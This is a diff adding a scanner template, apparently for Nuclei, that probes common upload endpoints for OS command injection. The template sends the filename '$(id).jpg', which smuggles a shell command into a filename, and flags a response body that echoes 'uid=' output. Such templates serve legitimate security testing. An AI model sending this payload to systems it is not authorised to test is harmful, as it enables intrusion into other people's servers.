@@ -1,0 +1,31 @@
+id: m7-cmdi-file-upload
+info:
+  name: M7 - CMDi via File Upload Filename
+  author: Sharlix
+  severity: critical
+  description: OS command injection via file upload filename parameter
+  tags: cmdi,upload,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/file/upload"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----m7b
+
+    body: |
+      ------m7b
+      Content-Disposition: form-data; name="file"; filename="$(id).jpg"
+      Content-Type: image/jpeg
+
+      AAAA
+      ------m7b--
+
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\d+\(.*?\)"
+        part: body
